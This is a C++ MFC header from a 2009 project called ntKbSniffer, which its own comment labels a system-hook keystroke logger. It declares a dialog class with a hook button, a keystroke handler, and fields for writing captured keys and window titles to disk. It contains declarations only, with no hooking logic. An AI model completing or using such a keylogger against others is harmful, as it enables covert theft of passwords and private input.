/*
  This project was created and edited using the MFC SelfBanner AppWizard.

  Comment: 键盘记录工具－系统钩子.

  Project: ntKbSniffer.
  Author : dhyao
  Date   : 星期三, 二月 04, 2009
*/
/////////////////////////////////////////////////////////////////////

// ntKbSnifferDlg.h : header file
//

#if !defined(AFX_NTKBSNIFFERDLG_H__DF52B8DA_9B08_407A_B25B_C2310ED5723F__INCLUDED_)
#define AFX_NTKBSNIFFERDLG_H__DF52B8DA_9B08_407A_B25B_C2310ED5723F__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000

/////////////////////////////////////////////////////////////////////////////
// CNtKbSnifferDlg dialog

class CNtKbSnifferDlg : public CDialog
{
// Construction
public:
	BOOL RecWindowName();
	CNtKbSnifferDlg(CWnd* pParent = NULL);	// standard constructor
	afx_msg LRESULT OnKeyProcess(WPARAM w,LPARAM l);//Keystroke message handler

// Dialog Data
	//{{AFX_DATA(CNtKbSnifferDlg)
	enum { IDD = IDD_NTKBSNIFFER_DIALOG };
	CButton	m_hook;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CNtKbSnifferDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;
	void Subst(const char* src, const char* dest);
	BOOL m_bHooked;//to check whether hook is installed or not.
	CFile* m_diskfile;//To write keystrokes to disk.
	char m_buffer[20];//To hold keystroke info.
	UINT m_keycount;//Used to avoid disk writes for each keystroke.
	char old_winname[256],current_winname[256];//窗口名称

	// Generated message map functions
	//{{AFX_MSG(CNtKbSnifferDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnButtonExit();
	afx_msg void OnButtonHook();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_NTKBSNIFFERDLG_H__DF52B8DA_9B08_407A_B25B_C2310ED5723F__INCLUDED_)
